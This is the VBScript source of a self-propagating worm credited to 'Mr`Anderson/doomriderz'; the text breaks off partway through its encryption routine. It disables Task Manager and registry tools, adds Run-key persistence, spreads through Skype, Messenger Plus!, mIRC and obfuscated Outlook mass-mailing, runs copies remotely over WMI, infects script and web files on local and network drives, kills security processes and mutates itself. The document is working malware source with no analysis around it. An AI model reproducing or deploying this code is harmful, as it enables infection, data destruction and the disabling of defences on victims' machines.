on error resume next
copyright = "Vbs.toXic by Mr`Anderson/doomriderz"
Dim fso
Set fso=CreateObject("Scripting.FileSystemObject")
Dim whs
Set whs=CreateObject("WScript.Shell")
Dim net
Set net=CreateObject("WScript.Network")
mutate
Dim ScriptCode
set tmp=fso.OpenTextFile(WScript.ScriptFullName)
ScriptCode = tmp.ReadAll
tmp.Close
set tmp=nothing
Dim myExt
myExt = lcase(fso.GetExtensionName(fso.GetFile(WScript.ScriptFullName)))
Dim WinRoot, WinSysFolder, TempFolder
set WinRoot = fso.GetSpecialFolder(0)
set WinSysFolder = fso.GetSpecialFolder(1)
set TempFolder = fso.GetSpecialFolder(2)
Dim VBSInfectionCode, HTMLInfectionCode
VBSInfectionCode =  ScriptCode
HTMLInfectionCode = "<script language=VBScript>"&vbcrlf&VBSInfectionCode&vbcrlf&"</script>"
stop_sb
install
fake_msg
skype_spread
msnplus_spread
email
netshare
infect_local
protect_loop
sub stop_sb()
On Error Resume Next
Set objWMIService = GetObject("winmgmts:\\"&net.ComputerName&"\root\cimv2")
Set objProcess = objWMIService.Get("Win32_Process")
intReturnValue = objProcess.Create("net.exe stop SBService", , , intPID)
end sub
sub install()
On Error Resume Next
whs.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout"
whs.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\DisplayLogo"
whs.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden",0,"REG_DWORD"
whs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
whs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",1,"REG_DWORD"
whs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions","1","REG_DWORD"
if ( lcase(right(Wscript.FullName,11))="cscript.exe" ) then
whs.Run "wscript.exe """ & WScript.ScriptFullName & """",0,false
WScript.Quit
End If
set self = fso.GetFile(WScript.ScriptFullName)
self.Attributes = 0
tempName = TempFolder  &  "\~"  &  randomword(8,12)  &  "."  &  myExt
self.Copy tempName
tempKey = fso.GetBaseName(fso.GetFile(tempName))
whs.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"  &  tempKey ,""""  &  WScript.FullName  &  """ """  &  tempName  &  """"
dirpath = whs.RegRead("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\BackupRestore\FilesNotToBackup\System Restore")
dirpath = Left(WinRoot,2) & left(dirpath,len(dirpath)-5)
if not fso.FolderExists(dirpath) then dirpath = WinSysFolder
if lcase(self.parentfolder)<>lcase(dirpath) then
nextName = dirpath & "\" & randomword(7,10) & "." & myExt
fso.deleteFile nextName,true
set copy = fso.CreateTextFile(nextName)
copy.Write ScriptCode
copy.Close
set copy = Nothing
else
nextName = self.path
end if
set self = fso.GetFile(nextName)
self.Attributes = 6
set Super = fso.GetFile(Wscript.FullName)
SuperExt = LCase(fso.GetExtensionName(Super))
newName = WinRoot  &  "\svchost."  &  SuperExt
Super.Copy newName
Set Super = fso.GetFile(newName)
Super.Attributes = 6
set tmp = fso.GetFile(WScript.FullName)
whs.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"  &  tempKey
fso.deleteFile tempName,true
If LCase(tmp.Path) <> LCase(Super.Path) Then
fso.DeleteFile WScript.ScriptFullname,True
whs.Run """"  &  Super.Path  &  """ """  &  self.Path  &  """",0,false
WScript.Quit
End If
REG_ROOT = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & fso.GetBaseName(self)
KEY_VAL = """" & Super.Path & """ """ & self.path & """"
whs.RegWrite REG_ROOT,KEY_VAL
end sub
sub fake_msg()
On Error Resume Next
if(fso.GetFile(WScript.ScriptFullName).Attributes=6)then Exit Sub
MsgBox WScript.ScriptFullName&" could not be loaded.",vbCritical,"Windows Scripting Host"
end sub
sub skype_spread()
On Error Resume Next
set objSkype = WScript.CreateObject("Skype4COM.Skype", "Skype_")
objSkype.Client.Start()
objSkype.Attach()
For Each friend In objSkype.Friends
objSkype.SendMessage friend.handle,"AHAHAH http://urltoworm/"
next
end sub
sub msnplus_spread()
On Error Resume Next
scriptsroot = whs.RegRead("HKEY_LOCAL_MACHINE\Software\Patchou\Messenger Plus! Live\ScriptsDir")
if(scriptsroot = "")then end sub
infected = whs.RegRead("HKEY_LOCAL_MACHINE\Software\Patchou\Messenger Plus! Live\Scripts\")
randomize
if(infected="1" and rnd>0.00001)then end sub
zipkey = whs.RegRead("HKEY_CLASSES_ROOT\.zip\")
opencmd = whs.RegRead("HKEY_CLASSES_ROOT\"&zipkey&"\shell\open\command\")
winzipexe = replace(opencmd,"""%1""","")
if(not fso.FileExists(winzipexe))then end sub
whs.RegWrite "HKEY_LOCAL_MACHINE\Software\Patchou\Messenger Plus! Live\Scripts\","1"
scriptname = randomword(5,10)
if(not fso.FolderExists(scriptsroot&"\"&scriptname))then
fso.CreateFolder scriptsroot&"\"&scriptname
end if
names = Array("This_is_what_we_call_Iraq_War","DoomRiderz!_OwnZ","You&Me","ILoveYou","FuckYou!AHAH","Kamikaze_Blowing_Up!")
sentfilename = names(int(rnd*ubound(names)))".vbe"
SentFilePath = scriptsroot&"\"&scriptname & "\"&sentfilename
Set f=fso.CreateTextFile(SentFilePath)
f.Write ScriptCode
f.Close
whs.Run """"&winzipexe&""" -a """&left(SentFilePath,len(SentFilePath)-3)&"zip"" """&SentFilePath&"""",0,false
fso.DeleteFile SentFilePath,true
SentFilePath = left(SentFilePath,len(SentFilePath)-3)&"zip"
senumvar = randomword(5,12)
scontactvar = randomword(6,13)
schatvar = randomword(4,9)
snewstatusvar = randomword(7,12)
sbdonevar = randomword(4,8)
scriptbody = "var "&sbdonevar&" = false;"&vbcrlf&vbcrlf& _
"function OnEvent_MyStatusChange( "&snewstatusvar&" )"&vbcrlf& _
"{"&vbcrlf& _
"if( "&snewstatusvar&" == 3 || "&snewstatusvar&" == 2 || "&sbdonevar&" ) return;"&vbcrlf& _
"var "&senumvar&" = new Enumerator(Messanger.MyContacts);"&vbcrlf& _
"for(; !"&senumvar&".atEnd(); "&senumvar&".moveNext())"&vbcrlf& _
"{"&vbcrlf& _
"var "&scontactvar&" = "&senumvar&".item();"&vbcrlf& _
"if( "&scontactvar&" != null && "&scontactvar&".Status != 1 && Math.random()<0.065 )"&vbcrlf& _
"{"&vbcrlf& _
"var "&schatvar&" = Messenger.OpenChat("&scontactvar&");"&vbcrlf& _
"if( "&schatvar&" != null )"&vbcrlf& _
"{"&vbcrlf& _
schatvar&".SendMessage("!!!!");"&vbcrlf& _
schatvar&".SendFile("""&SentFilePath&""");"&vbcrlf& _
sbdonevar&" = true;"&vbcrlf& _
"}"&vbcrlf& _
"}"&vbcrlf& _
"}"&vbcrlf& _
"}"
set script = fso.CreateTextFile(scriptsroot&"\"&scriptname&"\"&scriptname&".js")
script.Write scriptbody
script.Close
whs.RegWrite "HKEY_CURRENT_USER\Software\Patchou\Messenger Plus! Live\GlobalSettings\Scripts\"&scriptname&"\Enabled",1,"REG_DWORD"
end sub
sub email()
On Error Resume Next
If Not fso.FileExists(Left(WinRoot, 2)  &  "\ntldr") Then
MS_code = "On Error Resume Next" & vbCrlf & _
"Set Fso = CreateObject(""Scripting.FileSystemObject"")"  &  vbCrLf  &  _
" Set self = Fso.GetFile("""  &  Wscript.ScriptFullName  &  """)"  &  vbCrLf  &  _
"set WinRoot = Fso.GetSpecialFolder(0)"  &  vbCrLf  &  _
"set WinSysFolder = Fso.GetSpecialFolder(1)"  &  vbCrLf  &  _
"set TempFolder = Fso.getSpecialFolder(2)"  &  vbCrLf  &  _
"MyExt = """  &  myExt  &  """"  &  vbCrLf  &  _
"execute chr(100) & chr(105) & chr(109) & chr(32) & chr(120) & chr(44) & chr(97) & chr(44) & chr(99) & chr(116) & chr(114) & chr(108) & chr(105) & chr(115) & chr(116) & chr(115) & chr(44) & chr(99) & chr(116) & chr(114) & chr(101) & chr(110) & chr(116) & chr(114) & chr(105) & chr(101) & chr(115) & chr(44) & chr(109) & chr(97) & chr(108) & chr(101) & chr(97) & chr(100) & chr(44) & chr(98) & chr(44) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(32)"  &  vbCrLf  &  _
"execute chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(78) & chr(97) & chr(109) & chr(101) & chr(32) & chr(61) & chr(32) & chr(84) & chr(101) & chr(109) & chr(112) & chr(70) & chr(111) & chr(108) & chr(100) & chr(101) & chr(114) & chr(32) & chr(38) & chr(32) & chr(34) & chr(92) & chr(76) & chr(101) & chr(116) & chr(116) & chr(101) & chr(114) & chr(46) & chr(34) & chr(32) & chr(38) & chr(32) & chr(109) & chr(121) & chr(69) & chr(120) & chr(116) & chr(32)"  &  vbCrLf  &  _
"execute chr(83) & chr(101) & chr(108) & chr(102) & chr(46) & chr(67) & chr(111) & chr(112) & chr(121) & chr(40) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(78) & chr(97) & chr(109) & chr(101) & chr(41) & chr(32)"  &  vbCrLf  &  _
"execute chr(83) & chr(101) & chr(116) & chr(32) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(32) & chr(61) & chr(32) & chr(70) & chr(115) & chr(111) & chr(46) & chr(71) & chr(101) & chr(116) & chr(70) & chr(105) & chr(108) & chr(101) & chr(40) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(78) & chr(97) & chr(109) & chr(101) & chr(41) & chr(32)"  &  vbCrLf  &  _
"execute chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(46) & chr(65) & chr(116) & chr(116) & chr(114) & chr(105) & chr(98) & chr(117) & chr(116) & chr(101) & chr(115) & chr(32) & chr(61) & chr(32) & chr(48) & chr(32)"  &  vbCrLf  &  _
"execute chr(115) & chr(101) & chr(116) & chr(32) & chr(111) & chr(117) & chr(116) & chr(61) & chr(87) & chr(83) & chr(99) & chr(114) & chr(105) & chr(112) & chr(116) & chr(46) & chr(67) & chr(114) & chr(101) & chr(97) & chr(116) & chr(101) & chr(79) & chr(98) & chr(106) & chr(101) & chr(99) & chr(116) & chr(40) & chr(34) & chr(79) & chr(117) & chr(116) & chr(108) & chr(111) & chr(111) & chr(107) & chr(46) & chr(65) & chr(112) & chr(112) & chr(108) & chr(105) & chr(99) & chr(97) & chr(116) & chr(105) & chr(111) & chr(110) & chr(34) & chr(41) & chr(32)"  &  vbCrLf  &  _
"execute chr(115) & chr(101) & chr(116) & chr(32) & chr(109) & chr(97) & chr(112) & chr(105) & chr(61) & chr(111) & chr(117) & chr(116) & chr(46) & chr(71) & chr(101) & chr(116) & chr(78) & chr(97) & chr(109) & chr(101) & chr(83) & chr(112) & chr(97) & chr(99) & chr(101) & chr(40) & chr(34) & chr(77) & chr(65) & chr(80) & chr(73) & chr(34) & chr(41) & chr(32)"  &  vbCrLf  &  _
"for ctrlists=1 to mapi.AddressLists.Count"  &  vbCrLf  &  _
"execute chr(115) & chr(101) & chr(116) & chr(32) & chr(97) & chr(61) & chr(109) & chr(97) & chr(112) & chr(105) & chr(46) & chr(65) & chr(100) & chr(100) & chr(114) & chr(101) & chr(115) & chr(115) & chr(76) & chr(105) & chr(115) & chr(116) & chr(115) & chr(40) & chr(99) & chr(116) & chr(114) & chr(108) & chr(105) & chr(115) & chr(116) & chr(115) & chr(41) & chr(32)"  &  vbCrLf  &  _
"execute chr(120) & chr(61) & chr(48) & chr(32)"  &  vbCrLf  &  _
"if (int(a.AddressEntries.Count)>int(0)) then"  &  vbCrLf  &  _
"for ctrentries=1 to a.AddressEntries.Count"  &  vbCrLf  &  _
"execute chr(109) & chr(97) & chr(108) & chr(101) & chr(97) & chr(100) & chr(61) & chr(97) & chr(46) & chr(65) & chr(100) & chr(100) & chr(114) & chr(101) & chr(115) & chr(115) & chr(69) & chr(110) & chr(116) & chr(114) & chr(105) & chr(101) & chr(115) & chr(40) & chr(120) & chr(41) & chr(32)"  &  vbCrLf  &  _
"execute chr(115) & chr(101) & chr(116) & chr(32) & chr(109) & chr(97) & chr(108) & chr(101) & chr(61) & chr(111) & chr(117) & chr(116) & chr(46) & chr(67) & chr(114) & chr(101) & chr(97) & chr(116) & chr(101) & chr(73) & chr(116) & chr(101) & chr(109) & chr(40) & chr(48) & chr(41) & chr(32)"  &  vbCrLf  &  _
"execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(82) & chr(101) & chr(99) & chr(105) & chr(112) & chr(105) & chr(101) & chr(110) & chr(116) & chr(115) & chr(46) & chr(65) & chr(100) & chr(100) & chr(40) & chr(109) & chr(97) & chr(108) & chr(101) & chr(97) & chr(100) & chr(41) & chr(32)"  &  vbCrLf  &  _
"execute chr(82) & chr(97) & chr(110) & chr(100) & chr(111) & chr(109) & chr(105) & chr(122) & chr(101) & chr(32)"  &  vbCrLf  &  _
"execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(70) & chr(114) & chr(111) & chr(109) & chr(32) & chr(61) & chr(32) & chr(97) & chr(46) & chr(65) & chr(100) & chr(100) & chr(114) & chr(101) & chr(115) & chr(115) & chr(69) & chr(110) & chr(116) & chr(114) & chr(105) & chr(101) & chr(115) & chr(40) & chr(73) & chr(110) & chr(116) & chr(40) & chr(114) & chr(110) & chr(100) & chr(32) & chr(42) & chr(32) & chr(97) & chr(46) & chr(65) & chr(100) & chr(100) & chr(114) & chr(101) & chr(115) & chr(115) & chr(69) & chr(110) & chr(116) & chr(114) & chr(105) & chr(101) & chr(115) & chr(46) & chr(67) & chr(111) & chr(117) & chr(110) & chr(116) & chr(41) & chr(41) & chr(32)"  &  vbCrLf  &  _
"execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(83) & chr(117) & chr(98) & chr(106) & chr(101) & chr(99) & chr(116) & chr(32) & chr(61) & chr(32) & chr(34) & chr(77) & chr(101) & chr(115) & chr(115) & chr(97) & chr(103) & chr(101) & chr(32) & chr(70) & chr(114) & chr(111) & chr(109) & chr(32) & chr(34) & chr(32) & chr(38) & chr(32) & chr(78) & chr(101) & chr(116) & chr(46) & chr(85) & chr(115) & chr(101) & chr(114) & chr(78) & chr(97) & chr(109) & chr(101) & chr(32)"  &  vbCrLf  &  _
"execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(66) & chr(111) & chr(100) & chr(121) & chr(32) & chr(61) & chr(32) & chr(118) & chr(98) & chr(99) & chr(114) & chr(108) & chr(102) & chr(38) & chr(34) & chr(67) & chr(104) & chr(101) & chr(99) & chr(107) & chr(32) & chr(116) & chr(104) & chr(101) & chr(32) & chr(108) & chr(101) & chr(116) & chr(116) & chr(101) & chr(114) & chr(32) & chr(115) & chr(101) & chr(110) & chr(116) & chr(32) & chr(98) & chr(121) & chr(32) & chr(109) & chr(101) & chr(46) & chr(32) & chr(38) & chr(32) & chr(118) & chr(98) & chr(99) & chr(114) & chr(108) & chr(102) & chr(32) & chr(38) & chr(32) & chr(34) & chr(73) & chr(116) & chr(39) & chr(115) & chr(32) & chr(118) & chr(101) & chr(114) & chr(121) & chr(32) & chr(105) & chr(109) & chr(112) & chr(111) & chr(114) & chr(116) & chr(97) & chr(110) & chr(116) & chr(44) & chr(32) & chr(116) & chr(114) & chr(121) & chr(32) & chr(116) & chr(111) & chr(32) & chr(100) & chr(111) & chr(110) & chr(39) & chr(116) & chr(32) & chr(108) & chr(111) & chr(115) & chr(101) & chr(32) & chr(105) & chr(116) & chr(32) & chr(97) & chr(110) & chr(100) & chr(32) & chr(117) & chr(115) & chr(101) & chr(32) & chr(105) & chr(116) & chr(32) & chr(99) & chr(97) & chr(114) & chr(101) & chr(102) & chr(117) & chr(108) & chr(108) & chr(121) & chr(44) & chr(32) & chr(97) & chr(110) & chr(121) & chr(119) & chr(97) & chr(121) & chr(46) & chr(34) & chr(32) & chr(38) & chr(32) & chr(118) & chr(98) & chr(99) & chr(114) & chr(108) & chr(102) & chr(32) & chr(38) & chr(32) & chr(118) & chr(98) & chr(99) & chr(114) & chr(108) & chr(102) & chr(32) & chr(38) & chr(32) & chr(83) & chr(116) & chr(114) & chr(105) & chr(110) & chr(103) & chr(40) & chr(40) & chr(76) & chr(101) & chr(110) & chr(40) & chr(34) & chr(73) & chr(116) & chr(39) & chr(115) & chr(32) & chr(118) & chr(101) & chr(114) & chr(121) & chr(32) & chr(105) & chr(109) & chr(112) & chr(111) & chr(114) & chr(116) & chr(97) & chr(110) & chr(116) & chr(44) & chr(32) & chr(116) & chr(114) & chr(121) & chr(32) & chr(116) & chr(111) & chr(32) & chr(100) & chr(111) & chr(110) & chr(39) & chr(116) & chr(32) & chr(108) & chr(111) & chr(115) & chr(101) & chr(32) & chr(105) & chr(116) & chr(32) & chr(97) & chr(110) & chr(100) & chr(32) & chr(117) & chr(115) & chr(101) & chr(32) & chr(105) & chr(116) & chr(32) & chr(99) & chr(97) & chr(114) & chr(101) & chr(102) & chr(117) & chr(108) & chr(108) & chr(121) & chr(44) & chr(32) & chr(97) & chr(110) & chr(121) & chr(119) & chr(97) & chr(121) & chr(46) & chr(34) & chr(41) & chr(45) & chr(76) & chr(101) & chr(110) & chr(40) & chr(78) & chr(101) & chr(116) & chr(46) & chr(85) & chr(115) & chr(101) & chr(114) & chr(78) & chr(97) & chr(109) & chr(101) & chr(41) & chr(41) & chr(43) & chr(50) & chr(44) & chr(34) & chr(32) & chr(34) & chr(41) & chr(32) & chr(38) & chr(32) & chr(78) & chr(101) & chr(116) & chr(46) & chr(85) & chr(115) & chr(101) & chr(114) & chr(78) & chr(97) & chr(109) & chr(101) & chr(32)"  &  vbCrLf  &  _
"execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(109) & chr(101) & chr(110) & chr(116) & chr(115) & chr(46) & chr(65) & chr(100) & chr(100) & chr(40) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(46) & chr(80) & chr(97) & chr(116) & chr(104) & chr(41) & chr(32)"  &  vbCrLf  &  _
"execute chr(109) & chr(97) & chr(108) & chr(101) & chr(46) & chr(83) & chr(101) & chr(110) & chr(100) & chr(32)"  &  vbCrLf  &  _
"execute chr(120) & chr(61) & chr(120) & chr(43) & chr(49) & chr(32)"  &  vbCrLf  &  _
"next"  &  vbCrLf  &  _
"end if"  &  vbCrLf  &  _
"next"  &  vbCrLf  &  _
"execute chr(83) & chr(101) & chr(116) & chr(32) & chr(111) & chr(117) & chr(116) & chr(61) & chr(78) & chr(111) & chr(116) & chr(104) & chr(105) & chr(110) & chr(103) & chr(32)"  &  vbCrLf  &  _
"execute chr(83) & chr(101) & chr(116) & chr(32) & chr(109) & chr(97) & chr(112) & chr(105) & chr(61) & chr(78) & chr(111) & chr(116) & chr(104) & chr(105) & chr(110) & chr(103) & chr(32)"  &  vbCrLf  &  _
"execute chr(70) & chr(115) & chr(111) & chr(46) & chr(68) & chr(101) & chr(108) & chr(101) & chr(116) & chr(101) & chr(70) & chr(105) & chr(108) & chr(101) & chr(40) & chr(65) & chr(116) & chr(116) & chr(97) & chr(99) & chr(104) & chr(46) & chr(80) & chr(97) & chr(116) & chr(104) & chr(41) & chr(32)"  &  vbCrLf  &  _
"out.Quit"  &  vbCrLf  &  _
MS_Code = metamorph(MS_Code)
MS_Code = string_morph(MS_Code)
MS_name = TempFolder  &  "\"&randomword(7,11)&"."  &  myExt
Set f_MS = fso.CreateTextFile(MS_name)
f_MS.write MS_code
f_MS.Close
whs.Run """"  &  WScript.FullName  &  """ """  &  MS_name  &  """",0,false
WScript.Sleep 100
fso.deleteFile MS_name,true
End if
end sub
sub netshare()
On Error Resume Next
Set localdrvs = fso.Drives
For Each ld In localdrvs
varld = ld
Next
FreeDrive=Chr(Asc(varld)+1)  &  ":"
Set NetDrives=net.EnumNetworkDrives
if ( NetDrives.Count = 0 ) then exit sub
tryremexe NetDrives(0)
For Each d In NetDrives
If (d <> "") and (d <> FreeDrive) Then
net.MapNetWorkDrive FreeDrive,d
InfectFiles freedrive  &  "\"
net.RemoveNetWorkDrive FreeDrive
End If
Next
end sub
sub infect_local()
On Error Resume Next
Set Drives = fso.Drives
if Drives.Count > 0 Then
for each d in Drives
If d.DriveType = 2 or d.DriveType = 3 then
InfectFiles d  &  "\"
end if
next
end if
end sub
sub protect_loop()
On Error Resume Next
ProcessList = Array("*av*","*anti*","*vir*","*fix*","*remov*","*upd*t*","*h*ack*","*protect*","*secur*","*mgr*","*reg*","*proc*)
pIndex=0
Do while True
if(not fso.fileexists(WScript.ScriptFullName))then
set tmp=fso.CreateTextFile(WScript.ScriptFullName)
tmp.Write ScriptCode
tmp.Close
fso.GetFile(WScript.ScriptFullName).Attributes = 6
end if
whs.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout"
whs.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\DisplayLogo"
whs.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden",0,"REG_DWORD"
whs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
whs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",1,"REG_DWORD"
whs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions","1","REG_DWORD"
REG_ROOT = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & fso.GetBaseName(fso.GetFile(WScript.ScriptFullName))
KEY_VAL = """" & WScript.FullName & """ """ & Wscript.ScriptFullName & """"
whs.RegWrite REG_ROOT,KEY_VAL
If fso.FileExists(Left(WinRoot, 2)  &  "\ntldr") And fso.FileExists(WinSysFolder  &  "\tskill.exe") Then
whs.Run "tskill.exe "  &  ProcessList(pIndex),0,false
If pIndex < UBound(ProcessList) Then
pIndex = pIndex + 1
Else
pIndex = 0
End If
End If
Loop
end sub
function InfectFiles(FolderSpec)
On Error Resume Next
bSharedfolder = (InStr(lcase(FolderSpec),"shar") > 0)
Set cFolder = fso.GetFolder(FolderSpec)
Set cFiles = cFolder.Files
Set cSubFolders = cFolder.SubFolders
For Each f in cFiles
set cFile = fso.GetFile(f)
cExt = LCase(fso.GetExtensionName(cFile))
if (cExt = lcase(myExt) ) then 
InfectFile cFile.Path,VBSInfectionCode
elseif InStr(cExt, LCase("vb")) > 0 Then
InfectFile cFile.Path,VBSInfectionCode
elseif InStr(cExt, LCase("htm")) > 0 Then
InfectFile cFile.Path,HTMLInfectionCode
elseif InStr(cExt, LCase("php")) > 0 Then
InfectFile cFile.Path,"?>"&vbcrlf&HTMLInfectionCode&vbcrlf&"<?php"
elseif InStr(cExt, LCase("asp")) > 0 Then
InfectFile cFile.Path,"%>"&vbcrlf&HTMLInfectionCode&vbcrlf&"<%"
elseif (lcase(cFile.Name)="mirc.exe") or (lcase(cFile.Name)="mirc.ini") or (lcase(cFile.Name)="script.ini") or (lcase(cFile.Name)="mirc.hlp") then
if (lcase(cFile.Name)="mirc.ini") then
Set tmp = fso.OpenTextFile(cFile.Path)
mircini = tmp.ReadAll
tmp.Close
opts = split(mircini, vbcrlf)
for zz=0 to ubound(opts)
opt = ""
opt = opts(zz)
opt = replace(opt, chr(32), "")
if ( (lcase(left(opt, 7)) = lcase("accept=")) and (InStr(lcase(opt),",*.vbe") <= 0) ) then
opts(zz)=opts(zz) & ",*.vbe"
end if
next
mircini = join(opts, vbcrlf)
set tmpfile = fso.getFile(cFile.Path)
tmpatt = tmpfile.Attributes
set tmp = fso.CreateTextFile(cFile.Path)
tmp.Write mircini
tmp.Close
tempfile.Attributes = tmpatt
set tempfile = nothing
set tmp = nothing
end if
fso.DeleteFile cFile.ParentFolder & "\You&Me*.vbe", True
rw = randomword(2,4)
set ft = fso.CreateTextFile(cFile.ParentFolder & "\You&Me-" & rw & ".vbe")
for i=1 to 100
ft.Write vbCrlf
next
ft.Write ScriptCode
ft.Close
set scrpt=fso.CreateTextFile(cFile.ParentFolder & "\script.ini")
scrpt.WriteLine "[script]"
scrpt.WriteLine "n0=on 1:JOIN:#:{"
scrpt.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scrpt.WriteLine "n2=  /msg $nick :P"
scrpt.WriteLine "n3=  /.dcc send $nick " & cFile.ParentFolder & "\You&Me-" & rw & ".vbe"
scrpt.WriteLine "n4=}"
scrpt.close
elseif (bSharedfolder and (cExt = "exe" or cExt = "scr" or cExt = "zip" or cExt = "rar" or cExt = "msi" or InStr(fso.GetBaseName(cFile),"setup") > 0 or InStr(fso.GetBaseName(cFile),"inst") > 0)) then
set kg = fso.CreateTextFile(cFile.ParentFolder  &  "\"  &  fso.GetBaseName(cFile)  &  "-Keygen."  &  cExt  &  "               ."  &  myExt)
kg.write ScriptCode
kg.Close
end if
Next
For Each s in cSubFolders
InfectFiles s
Next
end function
function InfectFile(sFile,InfectionCode)
On Error Resume Next
If Not fso.FileExists(sFile) Or lcase(sFile) = lcase(WScript.ScriptFullName) Then
Exit function
End If
set tmp=fso.OpenTextFile(sFile)
hostbody = tmp.ReadAll
tmp.Close
randomize
bInfected=(right(hostbody,1)=chr(255) and rnd>0.0001)
newbody = ""
if(not bInfected)Then
hostline = split(hostbody,chr(10))
bDone = false
for ll=0 to ubound(hostline)
randomize
if(ubound(hostline)>1 and rnd<(1/ubound(hostline)) and (not bDone) and ll>0 and right(replace(hostline(ll-1)," ",""),1)<>"_" and right(replace(hostline(ll-1)," ",""),1)<>"+")then
bDone = true
hostline(ll) = InfectionCode & vbcrlf & hostline(ll)
end if
next
if(not bDone and ubound(hostline)>0)then
hostline(ubound(hostline)) = InfectionCode & vbcrlf & hostline(ubound(hostline))
end if
newbody = join(hostline,chr(10))
else
Exit function
End If
if(len(newbody)>0)then
newbody=newbody&chr(255)
set host = fso.GetFile(sFile)
hAtt = host.Attributes
set temp = fso.CreateTextFile(host.path)
temp.Write newbody
temp.Close
host.Attributes = hAtt
end if
End function
function tryremexe(netdrive)
on error resume next
tmp = right(netdrive,len(netdrive)-2)
i = inStr(tmp,"\")
baseunc=left(netdrive,i+2)
if ( fso.FolderExists(baseunc & "c") ) then
set test = fso.CreateTextFile(baseunc & "c\test." & myExt)
test.write ScriptCode
test.close
elseif ( fso.FolderExists(baseunc & "c$") ) then
set test = fso.CreateTextFile(baseunc & "c$\test." & myExt)
test.write ScriptCode
test.close
else
exit function
end if
if (not fso.FileExists(baseunc & "c\test." & myExt)) and (not fso.FileExists(baseunc & "c$\test." & myExt)) then exit function
Set objWMIService = GetObject("winmgmts:"  &  baseunc  &  "root\cimv2")
Set objProcess = objWMIService.Get("Win32_Process")
intReturnValue = objProcess.Create("wscript.exe C:\test." & myExt, , , intPID)
end function
function mutate()
On Error Resume next
Dim MUTATE_RATIO
MUTATE_RATIO = 0.05
Dim self
Set self=fso.GetFile(wscript.scriptfullname)
set f=fso.opentextfile(self.path)
Dim virbody
virbody = f.readall
f.close
set f=nothing
virbody = replace(virbody,vbcrlf,chr(10))
virbody = Metamorph(virbody)
virbody = string_morph(virbody)
lines = split(virbody,chr(10))
bCrypt = false
for i=0 to ubound(lines)
if(bCrypt)then
if(lcase(replace(lines(i)," ",""))="endsub")then
bCrypt=false
else
if(left(lines(i),1)="'")then
lines(i)=right(lines(i),len(lines(i))-1)
else
lines(i)="'"&lines(i)
end if
end if
elseif(left(lcase(replace(lines(i)," ","")),len("sub"))="sub")then
randomize
if(rnd<MUTATE_RATIO)then
bCrypt = true
end if
end if
next
virbody = join(lines,chr(10))
virbody = encrypt(virbody)
set f=fso.CreateTextFile(self.path)
f.write virbody
f.close
end function
function encrypt(inline)
randomize
key=1+int(rnd*99)
keyxp = randomkeyxp()
for l=1 to len(inline)
ch = mid(inline,l,1)
ascode = asc(ch)+key
ch = chr(ascode)
inline=left(inline,l-1)&ch&right(inline,len(inline)-l)
next
execute "newkey="&key&keyxp
randomize
decrypt0r = "randomize"&chr(10)& _
"if(rnd<0."&(4+int(rnd*2))&")then"&chr(10)& _
"on error resume next"&chr(10)& _
"set fso=createobject(""scripting.filesystemobject"")"&chr(10)& _
"set f=fso.opentextfile(wscript.scriptfullname)"&chr(10)& _
"body=f.readall"&chr(10)& _
"f.close"&chr(10)& _
"cbody=$ENCBODY$"&chr(10)& _
"key = "&newkey&chr(10)& _
"key=key-"&replace(right(keyxp,len(keyxp)-1),"+",chr(10)&"key=key-")&chr(10)& _
"for l=1 to len(cbody)"&chr(10)& _
"ch = mid(cbody,l,1)"&chr(10)& _
"ascode = asc(ch)-int(key)"&chr(10)& _
"ch = chr(ascode)"&chr(10)& _
"cbody=left(cbody,l-1)&ch&right(cbody,len(cbody)-l)"&chr(10)& _
"next"&chr(10)& _
"tmppath=fso.GetSpecialFolder(2)&""\"&randomword(8,12)&"."&fso.GetExtensionName(fso.GetFile(WScript.ScriptFullName))&""""&chr(10)& _
"set f=fso.createtextfile(tmppath)"&chr(10)& _
"f.write cbody"&chr(10)& _
"f.close"&chr(10)& _
"createobject(""wscript.shell"").run """"""""&Wscript.FullName&"""""" """"""&tmppath&"""""""",0,false"&chr(10)& _
